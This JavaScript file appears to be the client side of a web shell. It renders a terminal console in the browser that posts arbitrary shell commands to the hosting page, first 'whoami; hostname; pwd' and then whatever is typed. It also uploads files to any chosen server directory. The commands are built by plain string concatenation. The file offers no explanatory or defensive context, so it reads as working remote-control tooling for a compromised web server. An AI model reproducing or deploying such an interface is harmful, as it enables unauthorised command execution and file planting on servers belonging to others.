var username = "";
var hostname = "";
var current_dir = "";
var previous_dir = "";
var default_dir = "";
var commands_history = [];
var current_command = 0;

$(function () {
	initShell();
	
	$(document).on("keydown", checkForArrowKeys);
	
	$(".terminal_console > .input > form").on("submit", function(event){
		event.preventDefault()
	});
	
	$(window).resize(function() {
		updateInputWidth();
	});
});

function refresh() {
	document.location = "" + document.location;
}

function initShell() {
	$.ajax({
		type : "post",
		url : "" + document.location,
		data : {
			"cmd": "whoami; hostname; pwd"
		},
		dataType : "text",
		success : function(data, textStatus, jqXHR) {
			//console.log(data);
			data = decodeURI(data);
			var parts = data.split("<br>");
			username = parts[0];
			hostname = parts[1];
			current_dir =  parts[2].replace(new RegExp("&sol;", "g"), "/").replace(new RegExp("&lowbar;", "g"), "_");
			default_dir = current_dir;
			
			$(".terminal_console > .input > form > .username").html("<div class='user_id' style='display: inline;'>" + username + "@" + hostname + "</div>:" + current_dir + "#");
			
			updateInputWidth();
		}
	});
}

function sendCommand() {
	var terminal_console = $(".terminal_console");
	var output_elm = terminal_console.children(".output");
	var input_text_elm = terminal_console.find(" > .input > form > .input_text");	
	var command = input_text_elm.val();
	var original_command = command;
	var original_dir = current_dir;
	var cd = false;
	
	commands_history.push(original_command);
	switchCommand(commands_history.length);
	input_text_elm.val("");

	var parsed_command = command.split(" ");

	if (parsed_command[0] == "cd") {
		cd = true;
		
		if (parsed_command.length == 1)
			command = "cd " + default_dir + "; pwd";
		else if (parsed_command[1] == "-")
			command = "cd " + previous_dir + "; pwd";
		else
			command = "cd " + current_dir + "; " + command + "; pwd";
	}
	else if (parsed_command[0] == "clear") {
		output_elm.html("");
		return false;
	}
	else if (parsed_command[0] == "upload") {
		terminal_console.find(" > .upload > .file_browser").click();
		return false;
	}
	else
		command = "cd " + current_dir + "; " + command;
	
	$.ajax({
		type : "post",
		url : "" + document.location,
		data : {
			"cmd": encodeURIComponent(command)
		},
		dataType : "text",
		success : function(data, textStatus, jqXHR) {
			var username_elm = terminal_console.find(" > .input > form > .username");
			
			if (cd) {
				data = decodeURI(data);
				var parts = data.split("<br>");
				previous_dir = current_dir;
				current_dir = parts[0].replace(new RegExp("&sol;", "g"), "/").replace(new RegExp("&lowbar;", "g"), "_");
				
				output_elm.append("<div><span class='user_id'>" + username + "@" + hostname + "</span>" + ":" + original_dir + "# " + original_command + "</div>");
				
				username_elm.html("<div class='user_id' style='display: inline;'>" + username + "@" + hostname + "</div>:" + current_dir + "#");
			}
			else {
				output_elm.append("<div><span class='user_id'>" + username + "@" + hostname + "</span>" + ":" + current_dir + "# " + original_command + "</div><div>" + data.replace(new RegExp("<br><br>$"), "<br>") + "</div>");
				
				output_elm.scrollTop(output_elm[0].scrollHeight);
			}
			
			updateInputWidth();
		}
	});

	return false;
}

function uploadFile() {
	var terminal_console = $(".terminal_console");
	var output_elm = terminal_console.children(".output");
	var file_browser_elm = terminal_console.find(" > .upload > .file_browser");
	var files = file_browser_elm[0].files;
	
	var form_data = new FormData();
	form_data.append('file', files[0], files[0].name);
	form_data.append('path', current_dir);
	
	$.ajax({
		type : "post",
		url : "" + document.location,
		data : form_data,
		dataType : "text",
		processData: false,
		contentType: false,
		cache: false,
		success : function(data, textStatus, jqXHR) {
			output_elm.append(data + "<br>");
		}
	});
	
	output_elm.append("<div><span class='user_id'>" + username + "@" + hostname + "</span>" + ":" + current_dir + "# Uploading " + files[0].name + "...</div>");
}

function updateInputWidth() {
	var terminal_console = $(".terminal_console");
	var input_elm = terminal_console.children(".input");
	var username_elm = input_elm.find(" > form > .username");
	
	var width = input_elm.width() - username_elm.width() - 15;
	
	$(".terminal_console > .input > form > .input_text").css("width", width + "px");
}

function checkForArrowKeys(e) {
	e = e || window.event;

	if (e.keyCode == '38')
		previousCommand();
	else if (e.keyCode == '40')
		nextCommand();
}

function previousCommand() {
	if (current_command != 0)
		switchCommand(current_command - 1);
}

function nextCommand() {
	if (current_command != commands_history.length)
		switchCommand(current_command + 1);
}

function switchCommand(newCommand) {
	var terminal_console = $(".terminal_console");
	var input_text_elm = terminal_console.find(" > .input > form > .input_text");	
	
	current_command = newCommand;

	if (current_command == commands_history.length)
		input_text_elm.val("");
	else {
		input_text_elm.val(commands_history[current_command]);
		
		setTimeout(function(){ 
			input_text_elm[0].selectionStart = input_text_elm[0].selectionEnd = 10000; 
		}, 0);
	}
}
